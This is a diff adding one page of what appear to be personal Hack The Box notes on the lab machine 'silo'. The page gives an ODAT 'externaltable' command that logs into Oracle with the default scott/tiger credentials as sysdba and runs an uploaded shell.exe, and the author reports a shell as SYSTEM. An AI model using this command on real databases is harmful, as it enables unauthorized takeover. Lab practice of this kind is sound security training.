@@ -1,0 +1,31 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>odat externaltable</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><div class="main"><div class="tree">
+<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
+<p><a href="HacktheBox--Windows_Boxes--silo.html">silo</a></p>
+
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--silo--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool.html">Oracle Database Attack Tool</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool--SID_Guesser.html">SID Guesser</a></li>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool--oracle_default_account_wordlist.html">oracle default account wordlist</a></li>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool--odat_passwordguesser.html">odat passwordguesser</a></li>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool--odat_upload.html">odat upload</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool--odat_upload--odat_utlfile_-h.html">odat utlfile -h</a></li>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool--odat_upload--msfvenom.html">msfvenom</a></li>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool--odat_upload--utlfile.html">utlfile</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool--odat_externaltable.html">odat externaltable</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--silo--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Windows_Boxes--silo--lessons_learned.html">lessons learned</a></li>
+</ol></div>
+<div class="page"><h1><b><u>odat externaltable</u></b></h1><span style="color:#ffa500;">odat</span> <span style="color:#ffa500;">externaltable -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba</span><br /><br /><img src="images/699-1.png" alt="images/699-1.png" /><br /><br /><span style="color:#24ff00;">check back to our listener and we have connected to the box as </span><span style="color:#ffff00;">system</span><span style="color:#24ff00;">! no need to priv esc</span><br /><img src="images/699-2.png" alt="images/699-2.png" /></div></div>
+</body></html>
